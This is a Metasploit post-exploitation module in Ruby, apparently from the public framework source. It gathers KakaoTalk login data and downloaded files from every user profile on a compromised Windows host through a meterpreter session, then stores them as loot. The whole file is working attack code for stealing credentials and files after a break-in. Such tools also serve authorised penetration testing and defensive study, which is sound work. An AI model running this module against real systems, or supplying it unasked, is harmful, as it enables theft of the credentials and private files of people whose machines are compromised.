##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat
  ARTIFACTS =
    {
      application: 'Kakao',
      app_category: 'chats',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'LocalAppData',
          dir: 'Kakao',
          artifact_file_name: 'login_list.dat',
          description: 'The email address used for login',
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:login_list.*)'
              ]
            }
          ]
        },
        {
          filetypes: 'files',
          path: 'MyDocs',
          dir: 'KakaoTalk Downloads',
          artifact_file_name: '*',
          description: 'Fiels that were downloaded to the host machine'
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'KakaoTalk Credential Gatherer',
        'Description' => %q{
          This module searches for KakaoTalk credentials on a Windows host. KakaoTalk is a popular mobile messaging app most widely used in South Korea.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep completed'
  end
end
